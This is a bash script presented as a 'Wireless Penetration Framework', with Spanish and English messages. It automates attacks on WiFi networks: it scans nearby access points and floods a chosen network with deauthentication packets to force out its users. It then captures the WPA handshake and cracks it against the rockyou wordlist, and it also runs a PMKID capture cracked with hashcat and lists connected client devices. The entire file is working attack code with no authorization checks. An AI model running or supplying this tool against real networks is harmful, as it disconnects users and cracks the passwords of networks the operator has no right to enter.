#!/bin/bash

# Author: 
#	s4vitar V3.0
#	Diegomjx V4.0 - V5.0   

# Colores
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

export DEBIAN_FRONTEND=noninteractive
default_wordlist="/usr/share/wordlists/rockyou.txt"

trap ctrl_c INT

# ASCII Art
function print_banner() {
    clear
    echo -e "${greenColour}"
    echo ' ███▄ ▄███▓ ██▓ ███▄    █   ██████  ██▓ ▄▄▄       ██▓███  '
    echo '▓██▒▀█▀ ██▒▓██▒ ██ ▀█   █ ▒██    ▒ ▓██▒▒████▄    ▓██░  ██▒'
    echo '▓██    ▓██░▒██▒▓██  ▀█ ██▒░ ▓██▄   ▒██▒▒██  ▀█▄  ▓██░ ██▓▒'
    echo '▒██    ▒██ ░██░▓██▒  ▐▌██▒  ▒   ██▒░██░░██▄▄▄▄██ ▒██▄█▓▒ ▒'
    echo '▒██▒   ░██▒░██░▒██░   ▓██░▒██████▒▒░██░ ▓█   ▓██▒▒██▒ ░  ░'
    echo '░ ▒░   ░  ░░▓  ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░░▓   ▒▒   ▓▒█░▒▓▒░ ░  ░'
    echo '░  ░      ░ ▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░ ▒ ░  ▒   ▒▒ ░░▒ ░     '
    echo '░      ░    ▒ ░   ░   ░ ░ ░  ░  ░   ▒ ░  ░   ▒   ░░       '
    echo '       ░    ░           ░       ░   ░        ░  ░         '
    echo -e "${endColour}"
    echo -e "${turquoiseColour}         E-Corp Wireless Penetration Framework v4.2${endColour}\n"
}

function ctrl_c(){
    echo -e "\n\n${redColour}  [!]${endColour} ${purpleColour}Terminating attack sequence...${endColour}"
    tput cnorm; airmon-ng stop ${networkCard}mon > /dev/null 2>&1
    systemctl restart network-manager &>/dev/null
    systemctl restart NetworkManager &>/dev/null
    systemctl restart wpa_supplicant &>/dev/null
    systemctl restart networking &>/dev/null
    rm Captura* myHashes temp*.csv 2>/dev/null
    exit 0
}

function select_interface() {
    interfaces=($(iw dev | awk '$1=="Interface"{print $2}'))
    if [ ${#interfaces[@]} -eq 0 ]; then
        echo -e "${redColour}  [!] No wireless interfaces found!${endColour}"
        exit 1
    fi

    echo -e "\n${greenColour}  Available interfaces:${endColour}"
    for i in "${!interfaces[@]}"; do 
        echo -e "  ${purpleColour}$(($i+1)).${endColour} ${blueColour}${interfaces[$i]}${endColour}"
    done

    echo -en "\n  ${greenColour}[>]${endColour} ${turquoiseColour}Select interface: ${endColour}"
    read -p "" iface_choice
    networkCard=${interfaces[$(($iface_choice-1))]}
    
}

function select_ssid() {
    declare -a ssids
    
    echo -e "\n${greenColour}  Scanning networks... (Ctrl+C to stop)${endColour}"
    timeout --foreground 30 airodump-ng ${networkCard}mon -w temp --output-format csv > /dev/null 2>&1
    
    bssid=($(grep -E '([A-Fa-f0-9]{2}:){5}[A-Fa-f0-9]{2}' temp-01.csv | awk -F',' '{print $1}' | sed 's/^ //' ))
    channels=($(grep -E '([A-Fa-f0-9]{2}:){5}[A-Fa-f0-9]{2}' temp-01.csv | awk -F',' '{print $4}' | sed 's/^ //'))
    
    while IFS= read -r line; do
    	ssids+=("$line")  # Guardar el SSID en el array sin perder los espacios
    done < <(grep -E '([A-Fa-f0-9]{2}:){5}[A-Fa-f0-9]{2}' temp-01.csv | awk -F',' '{print $14}' | sed 's/^ //')
    
    echo -e "\n${greenColour}  Detected networks:${endColour}"
    for i in "${!ssids[@]}"; do
        echo -e "  ${purpleColour}$(($i+1)).${endColour}[${bssid[$i]}]${blueColour}${ssids[$i]}${endColour} (Channel: ${channels[$i]}) "
    done
    
    echo -en "\n  ${greenColour}[>]${endColour} ${turquoiseColour}Select attack: ${endColour}"
    read -p "" ssid_choice
    apBSSID=${bssid[$(($ssid_choice-1))]}
    apName=${ssids[$(($ssid_choice-1))]}
    apChannel=${channels[$(($ssid_choice-1))]}
    rm temp-01.csv
}

function select_wordlist() {
    if [ -f "$default_wordlist" ]; then
        echo -e "\n${greenColour}  Default wordlist found: ${purpleColour}$default_wordlist${endColour}"
        echo -en $'  '"${greenColour}[>]${endColour} ${turquoiseColour}Use default? (Y/n): ${endColour}" 
        read -p "" use_default
        if [[ $use_default =~ ^[Nn]$ ]]; then
            echo -en $'  '"${greenColour}[>]${endColour} ${turquoiseColour}Enter custom wordlist path: ${endColour}" 
            read -p "" custom_wordlist
            wordlist=$custom_wordlist
        else
            wordlist=$default_wordlist
        fi
    else
        echo -e "${redColour}  [!] Default wordlist not found!${endColour}"
        echo -en $'  '"${greenColour}[>]${endColour} ${turquoiseColour}Enter wordlist path: ${endColour}" 
        read -p "" wordlist
    fi
    
    while [ ! -f "$wordlist" ]; do
        echo -e "${redColour}  [!] Invalid file!${endColour}"
        echo -en $'  '"${greenColour}[>]${endColour} ${turquoiseColour}Enter valid wordlist path: ${endColour}" 
        read -p "" wordlist
    done
}

function attack_handshake() {
    select_ssid
    select_wordlist

    if [[ -z "$apChannel" || -z "$apBSSID" || -z "$apName" ]]; then
        echo -e "\n${redColour}  [!] Error: No se seleccionó una red válida.${endColour}"
        return 1
    fi

    echo -e "\n${greenColour}  [*] Starting attack on ${purpleColour}$apName${endColour} ${greenColour}(Channel: $apChannel)${endColour}"

    # Eliminar capturas previas
    rm -f Captura-*.cap Captura-*.csv 2>/dev/null

    # Asegurar que la tarjeta está en el canal correcto
    iwconfig ${networkCard}mon channel $apChannel

    # Iniciar captura con airodump-ng
    xterm -fg green -bg black -geometry 100x30+0+0 -e \
        "airodump-ng -c $apChannel --bssid \"$apBSSID\" -w Captura --output-format cap ${networkCard}mon" &  
    dump_pid=$!

    sleep 5  

    # Enviar paquetes de deauth en segundo plano
    echo -e "${greenColour}  [*] Sending deauth packets...${endColour}"
    xterm -fg red -bg black -geometry 100x30+1000+0 -e \
        "aireplay-ng -0 0 -a \"$apBSSID\" ${networkCard}mon" &
    deauth_pid=$!

    # Esperar hasta que se capture el handshake
    echo -e "\n${greenColour}  [*] Waiting for handshake...${endColour}"
    handshake_captured=false

    while [[ "$handshake_captured" == false ]]; do
        handshake_file=$(ls Captura*.cap 2>/dev/null | head -n 1)

        if [[ -f "$handshake_file" ]]; then
            aircrack_output=$(aircrack-ng -w $wordlist "$handshake_file")  # Sin -a2
            echo "$aircrack_output" | tee handshake_check.log

            if echo "$aircrack_output" | grep -q "WPA (1 handshake)"; then
                echo -e "\n${greenColour}  [✔] Handshake captured! Stopping attack...${endColour}"
                handshake_captured=true
                kill $deauth_pid 2>/dev/null
                killall aireplay-ng 2>/dev/null
            fi
        fi
        sleep 5
    done

    # Cerrar airodump-ng
    kill $dump_pid 2>/dev/null

    echo -e "\n${greenColour}  [*] Cracking handshake...${endColour}"
    aircrack-ng -w "$wordlist" "$handshake_file"
}


function attack_pkmid() {
    select_wordlist
    echo -e "\n${greenColour}  [*] Capturing PMKID packets (60 seconds)...${endColour}"
    timeout 60 hcxdumptool -i ${networkCard}mon -o Captura --enable_status=1
    
    echo -e "${greenColour}  [*] Extracting hashes...${endColour}"
    hcxpcaptool -z myHashes Captura
    
    if [ -s myHashes ]; then
        echo -e "${greenColour}  [*] Cracking hashes...${endColour}"
        hashcat -m 16800 myHashes "$wordlist" --force
    else
        echo -e "${redColour}  [!] No hashes captured!${endColour}"
    fi
}

function pasiv_Scann() {
    clear
    echo -e "\n${greenColour}  [*] ¿Quieres escanear todas las redes o una en específico?${endColour}"
    echo -e "  ${blueColour}[1]${endColour} Todas las redes"
    echo -e "  ${blueColour}[2]${endColour} Solo una red específica"
    echo -en "\n${greenColour}[>]${endColour} ${turquoiseColour}Selecciona una opción: ${endColour}"
    read -p "" scan_choice

    rm -f scan_results-*.csv  # Limpiar archivos previos

    if [[ "$scan_choice" == "2" ]]; then
        select_ssid
        if [[ -z "$apChannel" || -z "$apBSSID" || -z "$apName" ]]; then
            echo -e "\n${redColour}  [!] Error: No se seleccionó una red válida.${endColour}"
            return 1
        fi
        echo -e "\n${greenColour}  [*] Escaneando la red ${purpleColour}$apName${endColour} ${greenColour}(Canal: $apChannel)...${endColour}"
        airodump-ng -c "$apChannel" --bssid "$apBSSID" -w scan_results --output-format csv "${networkCard}mon" > /dev/null 2>&1 &
    else
        echo -e "\n${greenColour}  [*] Escaneando todas las redes...${endColour}"
        airodump-ng -w scan_results --output-format csv "${networkCard}mon" > /dev/null 2>&1 &
    fi

    scan_pid=$!  # Guardar el PID del escaneo

    echo -e "\n${yellowColour}  [*] Presiona CTRL+Q para detener el escaneo.${endColour}"

    trap 'kill $scan_pid 2>/dev/null; exit 0' SIGQUIT

    # Bucle para actualizar los resultados en tiempo real
    while true; do
        sleep 5  # Esperar 5 segundos antes de actualizar
        mostrarResultados
    done
}
function NO_Users(){
	input_file="scan_results-01.csv"

	# Buscar la línea donde comienza la sección de clientes
	start_line=$(grep -n "Station MAC, First time seen, Last time seen" "$input_file" | cut -d: -f1)

	if [[ -z "$start_line" ]]; then
	    echo "Encabezado no encontrado."
	    exit 1
	fi

	# Contar las líneas no vacías después del encabezado
	local count=$(tail -n +"$((start_line + 1))" "$input_file" | sed '/^[[:space:]]*$/d' | wc -l)
    
    echo "$count"  # Devuelve el número de clientes
	
}


function mostrarResultados() {  
    clear
    echo -e "\n${blueColour}  ────[ REDES DETECTADAS ]────${endColour}\n"

    if [[ ! -f "scan_results-01.csv" ]]; then
        echo -e "\n${redColour}  [!] No se encontraron datos aún...${endColour}"
        return
    fi

    # Separar secciones (Redes y Clientes)
    networks_section=true

    echo -e "┌─────────────────────────────────────┬───────────────────────┬─────────────┐"
    echo -e "│ ${yellowColour}SSID                               ${endColour} │ ${yellowColour}BSSID                ${endColour} │ ${yellowColour}Clientes${endColour}    │"
    echo -e "├─────────────────────────────────────┼───────────────────────┼─────────────┤"

    while IFS=',' read -r bssid _ _ channel speed _ _ _ _ _ _ _ _ ssid _ ; do
    	
        if [[ "$bssid" == "Station MAC" ]]; then
            networks_section=false
            printf "│ %-73s │\n" "CLientes conectados:"
            continue
        fi
        
        if [[ "$bssid" == "BSSID" ]]; then
            networks_section=true  
            continue
        fi
	num_clients=$(NO_Users)
        if [[ "$networks_section" == true && "$bssid" =~ ([A-Fa-f0-9]{2}:){5}[A-Fa-f0-9]{2} ]]; then
            # Es una red WiFi (AP)
            printf "│ %-35s │ %-21s │ %-11s │\n" "$ssid" "$bssid" "$num_clients"
            echo -e "├─────────────────────────────────────┴───────────────────────┴─────────────┤"
        fi
        
        
        if [[ "$networks_section" == false && "$bssid" =~ ([A-Fa-f0-9]{2}:){5}[A-Fa-f0-9]{2} ]]; then
              
              printf "│ %-75s │\n" " • MAC:$bssid Power:$channel Packets:$speed"
           
            #printf "│ %-35s │ %-21s │ %-10s │\n" "$ssid" "$bssid" "?"
        
        
        fi
            
            
    done < scan_results-01.csv
echo -e "└───────────────────────────────────────────────────────────────────────────┘"
}



# Main
function main(){
print_banner
if [ "$(id -u)" != "0" ]; then
    echo -e "${redColour}  [!] Run as root!${endColour}"
    exit 1
fi

dependencies=(aircrack-ng macchanger xterm hcxdumptool hcxpcaptool hashcat)
for dep in "${dependencies[@]}"; do
    if ! command -v $dep &> /dev/null; then
	echo -e "${redColour}  [!] Missing $dep! Installing...${endColour}"
	apt-get install -y $dep > /dev/null 2>&1
    fi
done

select_interface
airmon-ng check kill > /dev/null 2>&1
airmon-ng start $networkCard > /dev/null 2>&1

while true; do

	echo -e "\n${greenColour}  Attack vectors:${endColour}"
	echo -e "  ${purpleColour}1.${endColour} Handshake Capture"
	echo -e "  ${purpleColour}2.${endColour} PMKID Attack"
	echo -e "  ${purpleColour}3.${endColour} Passive Scann"
	echo -en $'\n  '"${greenColour}[>]${endColour} ${turquoiseColour}Select attack: ${endColour}"
	read attack_choice

	case $attack_choice in
	    1) attack_handshake ;;
	    2) attack_pkmid ;;
	    3) pasiv_Scann ;;
	    *) echo -e "${redColour}  [!] Invalid option!${endColour}"; break ;;
	esac	
done

ctrl_c
rm Captura* myHashes 2>/dev/null

}

main



